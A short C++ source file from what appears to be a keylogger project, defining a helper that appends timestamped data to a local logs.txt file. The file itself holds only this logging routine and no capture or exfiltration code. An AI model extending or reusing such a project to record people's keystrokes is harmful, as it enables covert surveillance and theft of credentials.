#include "Helper.h"

#include <fstream>

#include "TimestampFetcher.h"

namespace utils
{
void appendLog(const std::string& data)
{
    std::ofstream file("logs.txt", std::ios::app);
    file << "[" << keylogger::TimestampFetcher::getFormattedTimestamp() << "]\n" << data << std::endl << "\n";
}
}